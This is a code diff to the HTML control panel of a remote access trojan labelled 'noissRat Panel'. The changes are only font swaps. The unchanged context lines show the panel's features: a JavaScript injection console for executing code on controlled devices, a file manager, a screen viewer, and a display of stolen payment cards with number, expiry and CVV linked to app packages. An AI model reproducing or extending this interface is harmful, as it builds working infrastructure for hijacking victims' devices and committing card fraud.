@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>noissRat Panel - RAT Управление</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <script src="https://unpkg.com/feather-icons"></script>
     <script src="/theme.js?v=2"></script>
     <style>
@@ -40,7 +40,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
-            font-family: 'Inter', sans-serif;
+            font-family: 'Exo 2', sans-serif;
             background: var(--bg-dark);
             color: var(--text-white);
             min-height: 100vh;
@@ -659,7 +659,7 @@
         .fm-path {
             font-size: 0.72rem;
             color: var(--text-gray);
-            font-family: 'JetBrains Mono', monospace;
+            font-family: monospace;
             overflow: hidden;
             text-overflow: ellipsis;
             white-space: nowrap;
@@ -2051,11 +2051,11 @@
                     </div>
                     <div style="border-top:1px solid rgba(255,255,255,.1);padding:10px;">
                         <div style="font-size:11px;color:rgba(255,255,255,.5);margin-bottom:6px;" data-i18n="inject_js_section">JS Injection</div>
-                        <textarea id="injectJsCode" rows="3" style="width:100%;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.15);border-radius:6px;color:#fff;font-family:'JetBrains Mono',monospace;font-size:11px;padding:6px;resize:vertical;" placeholder="document.title"></textarea>
+                        <textarea id="injectJsCode" rows="3" style="width:100%;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.15);border-radius:6px;color:#fff;font-family:monospace;font-size:11px;padding:6px;resize:vertical;" placeholder="document.title"></textarea>
                         <div style="display:flex;gap:6px;margin-top:6px;">
                             <button class="fm-btn" onclick="executeInjectJs()" style="flex:1;"><i data-feather="play"></i> <span data-i18n="inject_execute">Выполнить</span></button>
                         </div>
-                        <div id="injectJsResult" style="display:none;margin-top:6px;padding:6px;background:rgba(0,0,0,.3);border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:11px;color:#0f0;max-height:100px;overflow:auto;"></div>
+                        <div id="injectJsResult" style="display:none;margin-top:6px;padding:6px;background:rgba(0,0,0,.3);border-radius:6px;font-family:monospace;font-size:11px;color:#0f0;max-height:100px;overflow:auto;"></div>
                     </div>
                 </div>
             </div>
@@ -6186,7 +6186,7 @@
                     .screenshot-modal-body img { max-width: 100%; max-height: 75vh; border-radius: 8px; }
                     #screenTreePanel {
                         background: #0d0d1a; border: 1px solid #2a2a4a; border-radius: 8px;
-                        padding: 12px; color: #ccc; font-family: 'JetBrains Mono', monospace; font-size: 12px;
+                        padding: 12px; color: #ccc; font-family: monospace; font-size: 12px;
                         max-height: 75vh; overflow-y: auto; min-width: 280px; max-width: 400px;
                         line-height: 1.6;
                     }
@@ -6968,7 +6968,7 @@
                     html += `<div style="display:flex;justify-content:space-between;align-items:center;">`;
                     html += `<span style="background:${c}33;color:${c};padding:1px 6px;border-radius:3px;font-weight:700;font-size:9px;">FULL CARD</span>`;
                     html += `<span style="color:#556;font-size:9px;">${time}</span></div>`;
-                    html += `<div style="color:#fff;font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:700;margin-top:4px;letter-spacing:1px;">${cardNum.replace(/</g,'&lt;')}</div>`;
+                    html += `<div style="color:#fff;font-family:monospace;font-size:14px;font-weight:700;margin-top:4px;letter-spacing:1px;">${cardNum.replace(/</g,'&lt;')}</div>`;
                     html += `<div style="display:flex;gap:12px;margin-top:3px;font-size:11px;">`;
                     if (g._expiry) html += `<span style="color:#fcc419;">EXP: ${g._expiry}</span>`;
                     if (g._cvv) html += `<span style="color:#ff922b;">CVV: ${g._cvv}</span>`;
@@ -6983,7 +6983,7 @@
                     html += `<span style="color:#aab;font-size:9px;font-weight:600;">${(g.app_name||g.app_package||'').replace(/</g,'&lt;')}</span>`;
                     html += `<span style="color:#556;font-size:9px;">${time}</span>`;
                     html += `</div>`;
-                    html += `<div style="color:#ddd;font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:600;margin-top:2px;">${masked}</div>`;
+                    html += `<div style="color:#ddd;font-family:monospace;font-size:12px;font-weight:600;margin-top:2px;">${masked}</div>`;
                     html += `${g.hint?'<div style="color:#556;font-size:10px;">'+g.hint.replace(/</g,'&lt;')+'</div>':''}`;
                     html += `</div>`;
                 }
